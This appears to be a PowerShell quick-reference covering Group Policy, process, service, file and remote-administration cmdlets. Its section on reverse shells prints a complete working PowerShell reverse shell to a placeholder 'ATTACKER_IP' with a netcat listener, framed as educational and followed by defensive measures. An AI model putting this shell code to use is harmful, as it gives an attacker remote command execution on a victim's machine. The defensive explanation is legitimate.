# PowerShell Quick Reference

This concise guide covers essential PowerShell commands for Group Policy management, understanding reverse shells, and other core system administration and security activities.

## 1. Group Policy Objects (GPOs)

GPOs are central to managing Windows environments. PowerShell cmdlets from the `ActiveDirectory` and `GroupPolicy` modules (requires RSAT) streamline their administration.

* **Retrieve GPOs:**
    ```powershell
    # Get a specific GPO by name
    Get-GPO -Name "Default Domain Policy"

    # Get all GPOs
    Get-GPO -All
    ```

* **Create a New GPO:**
    ```powershell
    New-GPO -Name "MyNewConfigGPO" -Comment "Custom settings for my team"
    ```

* **Link a GPO to an OU/Domain:**
    ```powershell
    # Link 'MyNewConfigGPO' to the 'Marketing' OU in example.com
    New-GPLink -Name "MyNewConfigGPO" -Target "OU=Marketing,DC=example,DC=com" -Enforced Yes
    ```

* **Modify GPO Settings (Conceptual):**
    * Directly modifying settings within a GPO requires more advanced scripting, often using `Set-GPRegistryValue` or `Set-GPPrefRegistryValue` for registry-based settings, or importing/exporting GPO settings.
    ```powershell
    # Example: Set a registry value within a GPO (requires specific parameters)
    # Set-GPRegistryValue -Name "MyNewConfigGPO" -Key "HKLM\Software\MyApp" -ValueName "Setting" -Value "1" -Type DWord
    ```

* **Remove GPO Link:**
    ```powershell
    Remove-GPLink -Name "MyNewConfigGPO" -Target "OU=Marketing,DC=example,DC=com"
    ```

## 2. Reverse Shells (Cybersecurity - Understanding & Defense)

A reverse shell is a connection initiated from a target machine back to an attacker's listening machine. For defenders, understanding how they work is crucial. Attackers often use PowerShell due to its native presence on Windows.

**Disclaimer:** The following is for educational purposes only, to understand how such commands *could* be structured. **Do not use this for malicious activities.**

* **Basic PowerShell Reverse Shell (Conceptual):**
    This example uses a simple TCP connection. A more robust shell would involve more complex logic, error handling, and often encryption.
    ```powershell
    # On Attacker's Machine: Set up a Netcat listener (e.g., nc -lvnp 4444)

    # On Victim's Machine (PowerShell):
    # Replace 'ATTACKER_IP' and 'PORT' with actual values
    # This command attempts to create a TCP client and send cmd.exe output back.
    # It's highly simplified and for conceptual understanding of the connection flow.
    $client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP', 4444);
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String);
        $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush();
    }
    $client.Close();
    ```
* **Defensive Measures:**
    * **PowerShell Logging:** Enable Script Block Logging and Module Logging via GPO to capture executed commands.
    * **Network Monitoring:** Look for unusual outbound connections.
    * **Endpoint Detection and Response (EDR):** Use EDR solutions to detect suspicious PowerShell behavior.
    * **Execution Policy:** While not a security boundary, `RemoteSigned` or `AllSigned` can deter simple script execution.

## 3. Other Key Activities

### Process & Service Management

* **List Processes:**
    ```powershell
    Get-Process -Name "chrome"
    ```
* **Stop a Process:**
    ```powershell
    Stop-Process -Name "notepad" -Force
    ```
* **List Services:**
    ```powershell
    Get-Service -DisplayName "*Windows Update*"
    ```
* **Start/Stop a Service:**
    ```powershell
    Start-Service -Name "Spooler"
    Stop-Service -Name "Spooler"
    ```

### File & Network Operations

* **Download a File:**
    ```powershell
    Invoke-WebRequest -Uri "[https://example.com/file.exe](https://example.com/file.exe)" -OutFile "C:\temp\downloaded_file.exe"
    ```
* **Copy a File:**
    ```powershell
    Copy-Item -Path "C:\source\document.txt" -Destination "\\Server\Share\document.txt"
    ```
* **Test Network Connectivity:**
    ```powershell
    Test-Connection -ComputerName "google.com" -Count 2
    ```
* **Resolve DNS Name:**
    ```powershell
    Resolve-DnsName -Name "[www.microsoft.com](https://www.microsoft.com)"
    ```

### Remote Execution & Event Logs

* **Run Command on Remote Computer (Requires PowerShell Remoting enabled):**
    ```powershell
    Invoke-Command -ComputerName "RemotePC01" -ScriptBlock { Get-EventLog -LogName System -Newest 5 }
    ```
* **Get Event Log Entries:**
    ```powershell
    # Get last 10 security events with ID 4624 (Successful Logon)
    Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4624)]]" -MaxEvents 10
    ```

## Important PowerShell & Windows Facts

* **Cmdlet Structure:** Always `Verb-Noun` (e.g., `Get-Process`, `Set-Item`).
* **Piping (`|`):** Send output of one command as input to another.
* **Execution Policy:** Controls script execution. Check with `Get-ExecutionPolicy`, change with `Set-ExecutionPolicy`. `RemoteSigned` is a common choice for security vs. usability.
* **PowerShell Remoting:** Essential for remote administration (`Enable-PSRemoting`, `Invoke-Command`, `Enter-PSSession`).
* **Logging:** Critical for security. Windows Event Forwarding and PowerShell logging (Script Block Logging, Module Logging) provide visibility into activity.

### How Variables Work

Variables are used to store data in PowerShell, making your scripts more dynamic and readable. They always start with a dollar sign (`$`).

* **Declaration & Assignment:** You declare and assign a value to a variable using the `=` operator.
    ```powershell
    $myString = "Hello, World!"  # Stores a text string
    $myNumber = 123              # Stores an integer
    $myBoolean = $true           # Stores a boolean (true/false)
    $myDate = Get-Date          # Stores the output of a cmdlet (a DateTime object)
    ```

* **Accessing Variable Values:** To use the value stored in a variable, simply refer to its name.
    ```powershell
    Write-Host $myString         # Outputs: Hello, World!
    ```

* **Variable Types:** PowerShell automatically infers the data type, but you can explicitly cast it if needed.
    ```powershell
    [int]$anotherNumber = "456"  # Forces the variable to be an integer
    $anotherNumber.GetType().Name # Outputs: Int32
    ```

* **String Expansion (Interpolation):** Variables inside double quotes (`" "`) are expanded to their values. Variables inside single quotes (`' '`) are treated literally.
    ```powershell
    $name = "Alice"
    Write-Host "Hello, $name!"    # Outputs: Hello, Alice!
    Write-Host 'Hello, $name!'    # Outputs: Hello, $name!
    ```

* **Special Variables:** PowerShell has built-in variables that provide useful information about the environment or the current operation.
    * `$_`: Represents the current object in the pipeline or loop.
    * `$PSVersionTable`: Contains details about the PowerShell version and host.
    * `$Error`: An array of recent error messages.
    * `$null`: Represents an empty or undefined value.
    ```powershell
    # Example using $_ in a pipeline
    Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name
    ```